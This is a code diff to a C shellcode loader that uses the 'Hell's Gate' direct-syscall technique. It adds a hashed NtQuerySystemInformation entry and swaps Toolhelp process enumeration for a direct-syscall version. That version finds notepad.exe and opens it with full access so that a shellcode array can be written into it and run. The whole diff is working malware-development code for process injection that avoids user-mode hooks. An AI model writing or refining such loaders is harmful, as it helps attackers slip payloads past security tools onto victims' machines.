@@ -20,6 +20,7 @@ typedef struct _VX_TABLE_ENTRY {
 } VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
 
 typedef struct _VX_TABLE {
+	VX_TABLE_ENTRY NtQuerySystemInformation;
 	VX_TABLE_ENTRY NtAllocateVirtualMemory;
 	VX_TABLE_ENTRY NtWriteVirtualMemory;
 	VX_TABLE_ENTRY NtProtectVirtualMemory;
@@ -83,12 +84,14 @@ unsigned char shellcode[] = {
 
 // Syscalls Hashes Values
 /*
+ 	printf("#define %s%s 0x%p \n", "NtQuerySystemInformation", "_djb2", (DWORD64)djb2("NtQuerySystemInformation"));
 	printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtAllocateVirtualMemory"));
 	printf("#define %s%s 0x%p \n", "NtWriteVirtualMemory", "_djb2", djb2("NtWriteVirtualMemory"));
 	printf("#define %s%s 0x%p \n", "NtProtectVirtualMemory", "_djb2", djb2("NtProtectVirtualMemory"));
 	printf("#define %s%s 0x%p \n", "NtCreateThreadEx", "_djb2", djb2("NtCreateThreadEx"));
 	printf("#define %s%s 0x%p \n", "NtWaitForSingleObject", "_djb2", djb2("NtWaitForSingleObject"));
 */
+#define NtQuerySystemInformation_djb2 0xCD38FAC529C112D7;
 #define NtAllocateVirtualMemory_djb2 0xF5BD373480A6B89B;
 #define NtWriteVirtualMemory_djb2 0x68A3C2BA486F0741;
 #define NtProtectVirtualMemory_djb2 0x858BCB1046FB6A37;
@@ -200,6 +203,10 @@ int main() {
 	//--------------------------------------------------------------------------
 	// Initializing the 'Table' structure ...
 	VX_TABLE Table = { 0 };
+	Table.NtQuerySystemInformation.dwHash = NtQuerySystemInformation_djb2;
+	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtQuerySystemInformation))
+		return 0x1;
+
 	Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
 	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
 		return 0x1;
@@ -222,7 +229,7 @@ int main() {
 
 	//--------------------------------------------------------------------------
 	// Enumerate processes
-
+	/*
 	HANDLE			hSnapShot = NULL;
 	HANDLE			hProcess = NULL;
 	PROCESSENTRY32	Proc = {
@@ -247,10 +254,60 @@ int main() {
 		}
 		// Next process if not matching
 	} while (Process32Next(hSnapShot, &Proc));
+	*/
+	HANDLE							hProcess = NULL;
+	ULONG							uReturnLen1 = NULL,
+									uReturnLen2 = NULL;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
+	NTSTATUS STATUS = 0x00;
+	LPWSTR	szProcessName = L"notepad.exe";
+
+
+
+	// Getting Handle to Remote Process
+
+	// First NtQuerySystemInformation call
+	// This will fail with STATUS_INFO_LENGTH_MISMATCH
+	// But it will provide information about how much memory to allocate (uReturnLen1)
+	HellsGate(Table.NtQuerySystemInformation.wSystemCall);
+	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);
+
+	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+	if (SystemProcInfo == NULL) {
+		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
+		return 0x1;
+	}
+
+	// Second NtQuerySystemInformation call
+	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
+	HellsGate(Table.NtQuerySystemInformation.wSystemCall);
+	if ((STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2)) != 0) {
+		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
+		return 0x1;
+	}
+
+	// Loop through the processes
+	while (TRUE) {
+
+		// Check the process's name size
+		// Comparing the enumerated process name to the intended target process
+		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcessName) == 0) {
+			// Openning a handle to the target process and saving it, then breaking 
+			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
+			break;
+		}
+
+		// if NextEntryOffset is 0, we reached the end of the array
+		if (!SystemProcInfo->NextEntryOffset)
+			break;
+
+		// moving to the next element in the array
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
+	}
 
 	//--------------------------------------------------------------------------
 	// Executing Payload
-	NTSTATUS STATUS = 0x00;
 	PVOID	pShellcodeAddress = NULL;
 	SIZE_T	sSizeOfShellcode = sizeof(shellcode);
 	SIZE_T	sNumberOfBytesWritten = NULL;
